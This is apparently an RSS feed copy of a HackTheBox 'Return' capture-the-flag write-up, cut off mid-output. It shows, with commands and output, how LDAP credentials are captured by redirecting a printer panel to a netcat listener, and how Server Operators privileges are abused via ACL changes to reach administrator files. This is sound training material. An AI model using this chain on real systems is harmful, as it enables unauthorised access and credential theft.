<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Server-operators on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/server-operators/</link>
    <description>Recent content in Server-operators on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sun, 24 Oct 2021 09:12:47 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/server-operators/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Return</title>
      <link>https://fahmifj.github.io/hackthebox/return/</link>
      <pubDate>Sun, 24 Oct 2021 09:12:47 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/return/</guid>
      <description>Return is another machine listed in the HTB printer exploitation track. This machine hosts a web panel for managing a network printer, and this panel stores a user credentials with a masked password. By changing the printer&amp;rsquo;s address to my IP, I can obtain the unmasked password. Enumerating the user&amp;rsquo;s info reveals that it&amp;rsquo;s member of two privileged groups which can then be abused to gain administrative access in multiple ways.</description>
      <content:encoded><![CDATA[<p>Return is another machine listed in the HTB printer exploitation track. This machine hosts a web panel for managing a network printer, and this panel stores a user credentials with a masked password. By changing the printer&rsquo;s address to my IP, I can obtain the unmasked password. Enumerating the user&rsquo;s info reveals that it&rsquo;s member of two privileged groups which can then be abused to gain administrative access in multiple ways.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Abusing network printer</li>
<li>Abusing Windows Server Operators group</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Netcat</li>
<li><a href="https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1">ACL-FullControl.ps1</a></li>
<li><a href="https://github.com/fahmifj/AAD-scripts/blob/main/Acl-RevokeFullControl.ps1">ACL-RevokeFullControl.ps1</a></li>
<li><a href="https://github.com/calebstewart/CVE-2021-1675">PrintNightmare LPE</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Full TCP scan discovers a bunch of ports open. Seeing port 53, 88, and 389, I can safely assume this is Active Directory system.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «return» «10.10.14.13» 
</span></span><span class="line"><span class="cl">$ fscan 10.10.11.108 <span class="k">return</span>
</span></span><span class="line"><span class="cl">nmap -p- 10.10.11.108 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
</span></span><span class="line"><span class="cl">nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49671,49673,49676,49688,59797 -sC -sV -oA nmap/all-tcp-ports-return 10.10.11.108
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-15 18:48 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.108
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.066s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
</span></span><span class="line"><span class="cl">53/tcp    open  domain        Simple DNS Plus
</span></span><span class="line"><span class="cl">80/tcp    open  http          Microsoft IIS httpd 10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: HTB Printer Admin Panel
</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2021-10-15 23:14:10Z<span class="o">)</span>
</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span class="line"><span class="cl">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: <span class="k">return</span>.local0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?
</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class="line"><span class="cl">636/tcp   open  tcpwrapped
</span></span><span class="line"><span class="cl">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: <span class="k">return</span>.local0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl">3269/tcp  open  tcpwrapped
</span></span><span class="line"><span class="cl">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf        .NET Message Framing
</span></span><span class="line"><span class="cl">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
</span></span><span class="line"><span class="cl">49664/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49665/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49666/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49667/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49669/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class="line"><span class="cl">49671/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49673/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49676/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49688/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">59797/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">Service Info: Host: PRINTER<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: 25m20s
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   2.02: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2021-10-15T23:15:10
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 72.44 seconds
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>On SMB, anonymous login is allowed, but there is no share available.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «return» «10.10.14.11» 
</span></span><span class="line"><span class="cl">$ smbclient -N -L //10.10.11.108/
</span></span><span class="line"><span class="cl">Anonymous login successful
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        Sharename       Type      Comment
</span></span><span class="line"><span class="cl">        ---------       ----      -------
</span></span><span class="line"><span class="cl">SMB1 disabled -- no workgroup available
</span></span></code></pre></div><p>I tried to enumerate the domain users, but got access denied.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «return» «10.10.14.11» 
</span></span><span class="line"><span class="cl">$ rpcclient -U <span class="s1">&#39;%&#39;</span> 10.10.11.108                                                     
</span></span><span class="line"><span class="cl">rpcclient $&gt; srvinfo
</span></span><span class="line"><span class="cl">Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
</span></span><span class="line"><span class="cl">rpcclient $&gt; enumdomusers 
</span></span><span class="line"><span class="cl">result was NT_STATUS_ACCESS_DENIED
</span></span></code></pre></div><h3 id="tcp-389---ldap">TCP 389 - LDAP</h3>
<p>Without creds, there is no hope here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «return» «10.10.14.11» 
</span></span><span class="line"><span class="cl">$ ldapsearch -LLL -x -h 10.10.11.108 -b <span class="s2">&#34;dc=return,dc=local&#34;</span>
</span></span><span class="line"><span class="cl">Operations error <span class="o">(</span>1<span class="o">)</span>
</span></span><span class="line"><span class="cl">Additional information: 000004DC: LdapErr: DSID-0C090A37, comment: In order to perform this operation a successful <span class="nb">bind</span> must be completed on the connection., data 0, v4563
</span></span></code></pre></div><h3 id="tcp-80---printer-panel">TCP 80 - Printer Panel</h3>
<p>A printer admin panel for managing printer is shown on port 80.</p>
<p><div class="img-container"><img src="imgs/image-20211017015705468.png" alt="image-20211017015705468"  /></div>
</p>
<p>Under the settings menu, I can see the printer&rsquo;s configuration, which reveals a username and a masked password. This password can&rsquo;t be unmasked by modifying the HTML attribute.</p>
<p><div class="img-container"><img src="imgs/image-20211017015826808.png" alt="image-20211017015826808"  /></div>
</p>
<p>Clicking on the update button sends out a POST request with parameter <code>ip</code> to Return&rsquo;s IP.</p>
<p><div class="img-container"><img src="imgs/image-20211017023404252.png" alt="image-20211017023404252"  /></div>
</p>
<p>The key takeaway from this is that I was the one who triggered that request.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-svc-printer">Shell as svc-printer</h3>
<h4 id="capturing-password">Capturing Password</h4>
<p>From the previous enumeration on printer panel, what if I change the server address to my IP and setup a nc listener?.</p>
<p><div class="img-container"><img src="imgs/image-20211017022203702.png" alt="image-20211017022203702"  /></div>
</p>
<p>The answer is the password pops up on my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «return» «10.10.14.11» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">389</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">389</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.11<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.108<span class="o">]</span> <span class="m">50904</span>
</span></span><span class="line"><span class="cl">0*<span class="sb">`</span>%return<span class="se">\s</span>vc-printer�
</span></span><span class="line"><span class="cl">                       1edFg43012!!
</span></span></code></pre></div><p>CrackMapExec shows that <code>return\svc-printer:1edFg43012!!</code> is a valid credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «return» «10.10.14.11» 
</span></span><span class="line"><span class="cl">$ crackmapexec smb 10.10.11.108 -u <span class="s1">&#39;svc-printer&#39;</span> -p <span class="s1">&#39;1edFg43012!!&#39;</span>
</span></span><span class="line"><span class="cl">SMB         10.10.11.108    <span class="m">445</span>    PRINTER          <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:PRINTER<span class="o">)</span> <span class="o">(</span>domain:return.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</span></span><span class="line"><span class="cl">SMB         10.10.11.108    <span class="m">445</span>    PRINTER          <span class="o">[</span>+<span class="o">]</span> <span class="k">return</span>.local<span class="se">\s</span>vc-printer:1edFg43012!! 
</span></span><span class="line"><span class="cl">→ kali@kali «return» «10.10.14.11» 
</span></span><span class="line"><span class="cl">$ crackmapexec winrm 10.10.11.108 -u <span class="s1">&#39;svc-printer&#39;</span> -p <span class="s1">&#39;1edFg43012!!&#39;</span> 	
</span></span><span class="line"><span class="cl">WINRM       10.10.11.108    <span class="m">5985</span>   PRINTER          <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> <span class="o">(</span>name:PRINTER<span class="o">)</span> <span class="o">(</span>domain:return.local<span class="o">)</span>
</span></span><span class="line"><span class="cl">WINRM       10.10.11.108    <span class="m">5985</span>   PRINTER          <span class="o">[</span>*<span class="o">]</span> http://10.10.11.108:5985/wsman
</span></span><span class="line"><span class="cl">WINRM       10.10.11.108    <span class="m">5985</span>   PRINTER          <span class="o">[</span>+<span class="o">]</span> <span class="k">return</span>.local<span class="se">\s</span>vc-printer:1edFg43012!! <span class="o">(</span>Pwn3d!<span class="o">)</span>
</span></span></code></pre></div><h4 id="winrm---svc-printer">WinRM - svc-printer</h4>
<p>I can login via WinRM and grab the flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «return» «10.10.14.11» 
</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.11.108 -u <span class="s1">&#39;svc-printer&#39;</span> -p<span class="s1">&#39;1edFg43012!!&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; 
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ..<span class="se">\D</span>esktop
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>esktop&gt; gci
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>esktop
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Mode                LastWriteTime         Length Name
</span></span><span class="line"><span class="cl">----                -------------         ------ ----
</span></span><span class="line"><span class="cl">-ar---       10/14/2021  10:33 PM             <span class="m">34</span> user.txt
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>esktop&gt; gc user.txt 
</span></span><span class="line"><span class="cl">48ba9...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="administrative-access">Administrative Access</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>Checking user&rsquo;s privileges with <code>whoami</code> reveals that <code>svc-printer</code> is a member of Server Operators and Print Operators. There are also some access tokens that can be abused.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>esktop&gt; whoami /all
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">USER INFORMATION
</span></span><span class="line"><span class="cl">----------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User Name          <span class="nv">SID</span>
</span></span><span class="line"><span class="cl"><span class="o">==================</span> <span class="o">=============================================</span>
</span></span><span class="line"><span class="cl"><span class="k">return</span><span class="se">\s</span>vc-printer S-1-5-21-3750359090-2939318659-876128439-1103
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">GROUP INFORMATION
</span></span><span class="line"><span class="cl">-----------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Group Name                                 Type             SID          <span class="nv">Attributes</span>
</span></span><span class="line"><span class="cl"><span class="o">==========================================</span> <span class="o">================</span> <span class="o">============</span> <span class="o">==================================================</span>
</span></span><span class="line"><span class="cl">Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\S</span>erver Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\P</span>rint Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\R</span>emote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\U</span>sers                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\P</span>re-Windows <span class="m">2000</span> Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\N</span>ETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\A</span>uthenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\T</span>his Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\N</span>TLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">Mandatory Label<span class="se">\H</span>igh Mandatory Level       Label            S-1-16-12288
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PRIVILEGES INFORMATION
</span></span><span class="line"><span class="cl">----------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Privilege Name                Description                         <span class="nv">State</span>
</span></span><span class="line"><span class="cl"><span class="o">=============================</span> <span class="o">===================================</span> <span class="o">=======</span>
</span></span><span class="line"><span class="cl">SeMachineAccountPrivilege     Add workstations to domain          Enabled
</span></span><span class="line"><span class="cl">SeLoadDriverPrivilege         Load and unload device drivers      Enabled
</span></span><span class="line"><span class="cl">SeSystemtimePrivilege         Change the system <span class="nb">time</span>              Enabled
</span></span><span class="line"><span class="cl">SeBackupPrivilege             Back up files and directories       Enabled
</span></span><span class="line"><span class="cl">SeRestorePrivilege            Restore files and directories       Enabled
</span></span><span class="line"><span class="cl">SeShutdownPrivilege           Shut down the system                Enabled
</span></span><span class="line"><span class="cl">SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
</span></span><span class="line"><span class="cl">SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
</span></span><span class="line"><span class="cl">SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set</span>      Enabled
</span></span><span class="line"><span class="cl">SeTimeZonePrivilege           Change the <span class="nb">time</span> zone                Enabled
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">USER CLAIMS INFORMATION
</span></span><span class="line"><span class="cl">-----------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User claims unknown.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Kerberos support <span class="k">for</span> Dynamic Access Control on this device has been disabled.
</span></span></code></pre></div><p>According to this <a href="https://ss64.com/nt/syntax-security_groups.html">site</a>, <strong>Server Operators</strong> is:</p>
<blockquote>
<p>A built-in group that exists only on domain controllers. By default, the group has no members. Server Operators can log on to a server interactively; create and delete network shares; start and stop services; back up and restore files; format the hard disk of the computer; and shut down the computer.</p>
</blockquote>
<p>I can say that <strong>Server Operators</strong> is the ultimate version of <strong>Backup Operators</strong>.</p>
<p>As for Print Operators, I&rsquo;ll remember from HTB: Fuse that it can be exploited by loading a malicious driver using <code>SeLoadDriverPrivilege</code>. I don&rsquo;t demo it here, so see <a href="https://0xdf.gitlab.io/2020/10/31/htb-fuse.html#priv-svc-print--system">this awesome post</a> by 0xdf instead.</p>
<p>Further enumeration reveals that Print Spooler is running ( ͡° ͜ʖ ͡°).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>esktop&gt; Get-Service -Name Spooler
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Status   Name               DisplayName
</span></span><span class="line"><span class="cl">------   ----               -----------
</span></span><span class="line"><span class="cl">Running  Spooler            Print Spooler
</span></span></code></pre></div><h4 id="diskshadow-failed">DiskShadow (failed)</h4>
<p>The back up and restore files involve two access tokens: <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code>. These tokens were previously abused to dump AD database (NTDS.d) in <a href="https://fahmifj.github.io/hackthebox/blackfield/#shell-as-administrator">HTB: Blackfield</a>.</p>
<p>I tried to reproduce the attack here, but I got the following results.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; diskshadow /s script.txt
</span></span><span class="line"><span class="cl">Microsoft DiskShadow version 1.0
</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2013</span> Microsoft Corporation
</span></span><span class="line"><span class="cl">On computer:  PRINTER,  10/16/2021 1:24:40 PM
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-&gt; <span class="nb">set</span> context persistent nowriters
</span></span><span class="line"><span class="cl">-&gt; add volume c: <span class="nb">alias</span> iamf
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">COM call <span class="s2">&#34;(*vssObject)-&gt;InitializeForBackup&#34;</span> failed.
</span></span></code></pre></div><p>The intended way, according to the official writeup, is to abuse the <code>Server Operators</code> ability to start/stop/modify services, but I&rsquo;ll put that aside.</p>
<h4 id="acl-full-access">ACL Full Access</h4>
<p>There is another way that still involves the <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code>. It&rsquo;s to modify ACL and grant myself full access to the file/folder I specified using <a href="https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1">this PowerShell script</a>. In the following, I use that script to own the entire admin&rsquo;s desktop folder.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt;Acl-FullControl -user <span class="k">return</span><span class="se">\s</span>vc-printer -path c:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Current permissions:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Path   : Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
</span></span><span class="line"><span class="cl">Owner  : BUILTIN<span class="se">\A</span>dministrators
</span></span><span class="line"><span class="cl">Group  : RETURN<span class="se">\D</span>omain Users
</span></span><span class="line"><span class="cl">Access : NT AUTHORITY<span class="se">\S</span>YSTEM Allow  FullControl
</span></span><span class="line"><span class="cl">         BUILTIN<span class="se">\A</span>dministrators Allow  FullControl
</span></span><span class="line"><span class="cl">         RETURN<span class="se">\A</span>dministrator Allow  FullControl
</span></span><span class="line"><span class="cl">Audit  :
</span></span><span class="line"><span class="cl">Sddl   : O:BAG:DUD:<span class="o">(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>SY<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>BA<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>LA<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Changing permissions to c:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Acls changed successfully.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Path   : Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
</span></span><span class="line"><span class="cl">Owner  : BUILTIN<span class="se">\A</span>dministrators
</span></span><span class="line"><span class="cl">Group  : RETURN<span class="se">\D</span>omain Users
</span></span><span class="line"><span class="cl">Access : RETURN<span class="se">\s</span>vc-printer Allow  FullControl
</span></span><span class="line"><span class="cl">         NT AUTHORITY<span class="se">\S</span>YSTEM Allow  FullControl
</span></span><span class="line"><span class="cl">         BUILTIN<span class="se">\A</span>dministrators Allow  FullControl
</span></span><span class="line"><span class="cl">         RETURN<span class="se">\A</span>dministrator Allow  FullControl
</span></span><span class="line"><span class="cl">Audit  :
</span></span><span class="line"><span class="cl">Sddl   : O:BAG:DUD:AI<span class="o">(</span>A<span class="p">;</span>OICI<span class="p">;</span>FA<span class="p">;;;</span>S-1-5-21-3750359090-2939318659-876128439-1103<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>SY<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>BA<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>LA<span class="o">)</span>
</span></span></code></pre></div><p>Now I can read the flag</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; <span class="nb">type</span> <span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\r</span>oot.txt
</span></span><span class="line"><span class="cl">9f8dd...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>I also made the <a href="https://github.com/fahmifj/AAD-scripts/blob/main/Acl-RevokeFullControl.ps1">anti script</a> to revert what I did on the admin&rsquo;s desktop folder.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; Acl-RevokeFullControl -User <span class="k">return</span><span class="se">\s</span>vc-printer -Path C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Current permissions:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Path   : Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
</span></span><span class="line"><span class="cl">Owner  : BUILTIN<span class="se">\A</span>dministrators
</span></span><span class="line"><span class="cl">Group  : RETURN<span class="se">\D</span>omain Users
</span></span><span class="line"><span class="cl">Access : RETURN<span class="se">\s</span>vc-printer Allow  FullControl
</span></span><span class="line"><span class="cl">         NT AUTHORITY<span class="se">\S</span>YSTEM Allow  FullControl
</span></span><span class="line"><span class="cl">         BUILTIN<span class="se">\A</span>dministrators Allow  FullControl
</span></span><span class="line"><span class="cl">         RETURN<span class="se">\A</span>dministrator Allow  FullControl
</span></span><span class="line"><span class="cl">Audit  :
</span></span><span class="line"><span class="cl">Sddl   : O:BAG:DUD:AI<span class="o">(</span>A<span class="p">;</span>OICI<span class="p">;</span>FA<span class="p">;;;</span>S-1-5-21-3750359090-2939318659-876128439-1103<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>SY<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>BA<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>LA<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
